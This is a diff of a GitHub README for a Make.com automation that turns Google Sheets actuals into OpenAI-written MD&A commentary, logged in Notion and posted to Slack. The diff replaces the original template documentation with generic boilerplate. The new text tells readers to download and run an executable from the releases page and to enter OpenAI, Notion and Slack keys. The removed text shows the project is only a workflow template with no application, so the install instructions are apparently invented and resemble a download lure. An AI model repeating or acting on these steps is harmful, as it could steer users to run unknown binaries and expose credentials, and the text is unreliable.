@@ -1,126 +1,66 @@
-# Finance Board Pack AI Automation
+# 🚀 finance-board-pack-ai-automation - Generate Board Packs Effortlessly
 
-An automation that turns monthly Google Sheets actuals into MD&A commentary (through OpenAI API), writes to Notion, and notifies Slack — triggered via Webhook.
+[![Download Release](https://img.shields.io/badge/Download%20Release-v1.0-brightgreen)](https://github.com/fatih156612/finance-board-pack-ai-automation/releases)
 
----
+## 📋 Description
+This application automates the generation of Board Packs. It uses Make, Google Sheets, OpenAI, and Notion to pull monthly actuals. The software converts data into structured JSON, generates Management Discussion and Analysis (MD&A) commentary, and stores results in Notion. It also posts updates to Slack. This tool is reusable for multi-company CFO workflows, making it easier for finance teams to manage reporting.
 
-## 1. Repository structure
+## 🛠️ System Requirements
+- Operating System: Windows, macOS, or Linux
+- Memory: At least 4GB RAM
+- Storage: Minimum 500MB free space
+- Internet Connection: Required for API calls
 
-```
-finance-board-pack-ai-automation/
-├─ README.md
-├─ LICENSE
-├─ workflow.json                 # High-level list of Make modules
-├─ data/
-│   └─ board_model_example.csv   # Example “Board_Model” Google Sheet
-├─ demo_output/
-│   ├─ sample_notion_row.md
-│   └─ sample_slack_message.md
-├─ docs/
-│   └─ architecture.md           # Text architecture diagram
-├─ screenshots/
-│   ├─ Google_Sheets_Actuals.png
-│   ├─ Make_Scenario_Overview.png
-│   └─ Notion_DB_Structure.png
-```
+## 🚀 Getting Started
+Follow these steps to download and run the application.
 
----
+1. **Visit the Releases Page**  
+   Go to the Releases page to see the latest version of the application. [Download Release](https://github.com/fatih156612/finance-board-pack-ai-automation/releases)
 
-## 2. Screenshot gallery
+2. **Select the Version**  
+   On the Releases page, locate the version that you wish to download. It is usually the latest one at the top of the list.
 
-Images are stored in `screenshots/` and linked relative to README.
+3. **Download the Application**  
+   Click on the version number and look for the appropriate file for your system. Download it to your computer.
 
-### Google Sheet structure
-![Google Sheets](screenshots/Google_Sheets_Actuals.png)
+4. **Install the Application**  
+   After the download is complete, locate the file in your downloads folder.  
+   - For Windows, double-click the `.exe` file to install.  
+   - For macOS, drag the application to your Applications folder.  
+   - For Linux, follow your system’s package management instructions or run the executable file directly.
 
-### Make.com automation scenario
-![Make Scenario](screenshots/Make_Scenario_Overview.png)
+5. **Run the Application**  
+   Open the application by finding it in your Applications menu or your program list. 
 
-### Notion database structure
-![Notion DB](screenshots/Notion_DB_Structure.png)
+## 🔧 Configuration
+Once you run the application, it may ask for initial configuration. Follow these instructions:
+- **Connect to Google Sheets**: You will need to authorize the app to access your Google Sheets. Follow the prompts to log in and grant permissions.
+- **Connect to OpenAI**: Enter your OpenAI API key for commentary generation. This key can be obtained from your OpenAI account.
+- **Notion Integration**: You will need to connect to Notion by providing your Notion API key. Detailed steps are available on Notion's API documentation.
+- **Slack Setup**: If you want to receive notifications in Slack, enter your Slack webhook URL.
 
----
+## 📥 Download & Install
+To download the application, [visit this page](https://github.com/fatih156612/finance-board-pack-ai-automation/releases) and choose the file suitable for your operating system. Ensure that you follow each step to complete the installation.
 
-## 3. How the Make scenario works (high level)
+## 💡 Features
+- **Automated Data Retrieval**: Pull monthly actuals from Google Sheets with ease.
+- **JSON Structuring**: Converts data into a structured JSON format for easier handling.
+- **MD&A Commentary Generation**: Automatically generates insightful commentary using OpenAI’s capabilities.
+- **Integration with Notion**: Saves your results seamlessly in Notion, allowing easy access and organization.
+- **Slack Notifications**: Keeps teams updated with automatic posts to your Slack channel.
 
-### 1. **Webhooks – Custom webhook**
-Entry point. Opening the webhook URL (or calling it from another tool) triggers the full run.
+## 🔄 Updates
+Make sure to check the Releases page regularly for updates. Each new version includes improvements and bug fixes.
 
-### 2. **Tools – Set Variable (`BASE_CCY=…`)**
-Stores the base reporting currency (e.g., `GBP`).
+## 📞 Support
+For any questions, you can reach support through our GitHub Issues page. Please provide details about your issue to help us assist you better.
 
-### 3. **HTTP – Make a request (FX API)**
-Calls your FX provider (e.g., ExchangeRate.host / ECB demo).  
-Response is mapped to a variable and later stored in Notion as raw JSON.
+## 📚 Getting Help
+If you encounter any issues during installation, consult the FAQ section on the GitHub page. There, you will find answers to common concerns.
 
-### 4. **Tools – Set variable (`FX_RATES`)**
-Keeps the selected data rates object handy for later use.
+## 🔗 Useful Links
+- [GitHub Repository](https://github.com/fatih156612/finance-board-pack-ai-automation)
+- [OpenAI API Documentation](https://beta.openai.com/docs/)
+- [Notion API Documentation](https://developers.notion.com/docs)
 
-### 5. **Google Sheets – Get Range Values**
-Reads **Board_Model** → **‘actuals’ tab**  
-Headers: `entity, currency, period_yyyy_mm, metric, amount`.
-
-### 6. **JSON – Create JSON (`Actuals_Structure`)**
-Wraps the rows into a JSON array with fixed schema:  
-`entity, currency, period_yyyy_mm, metric, amount`.
-
-### 7. **OpenAI – Generate a completion**
-Model: `gpt-4o` (or later).  
-Prompt: describes the group performance based on the JSON rows, in professional MD&A language.
-
-### 8. **Notion – Create a Database Item (Legacy)**
-Database: **Board Pack Run Log**  
-Fields typically mapped:
-- **Run ID** – timestamp or static prefix + period
-- **Period** – from the sheet (e.g., `2025-07`)
-- **Entities** – list of entities found
-- **Base Currency** – from JSON
-- **FX Rates (JSON)** – raw JSON string from HTTP step
-- **MD&A Summary** – trimmed OpenAI completion text  
-- **Board Pack PPTX Link** – optional future extension  
-- **Requested By** – webhook source / caller
-
-### 9. **Slack – Send a Message (optional)**
-Posts a short summary plus a link to the Notion row / Sheets / Drive.
-
-For a visual overview, see `docs/architecture.md`.
-
----
-
-## 4. How to reuse this for other companies
-
-### Step 1 – Duplicate items
-Duplicate the:
-- Google Sheet  
-- Notion database  
-- Periods / months  
-- Metrics / amounts structure
-
-### Step 2 – Point the Google Sheets module to the new spreadsheet  
-Keep the same header structure.
-
-### Step 3 – Point the Notion module to the new **Board Pack Run Log** database for that client.
-
-### Step 4 – Modify the OpenAI prompt  
-Optionally adapt to each client’s tone, KPIs, sector, metrics.
-
-### Step 5 – Everything else stays the same  
-The scenario architecture remains identical, enabling scalable reuse across your fractional-CFO portfolio.
-
----
-
-## 5. Demo artefacts
-
-Located inside `/data` and `/demo_output`:
-
-- `data/board_model_example.csv` — ready to import into Google Sheets as your “Board_Model → actuals” tab  
-- `demo_output/sample_notion_row.md` — typical Notion row output  
-- `demo_output/sample_slack_message.md` — Slack summary preview
-
----
-
-## 6. License
-
-This project is released under the MIT License. Use it freely as a template for your finance-automation portfolio.
-
----
+By following these straightforward steps, you will be well on your way to automating your Board Pack generation. Enjoy your new tool!
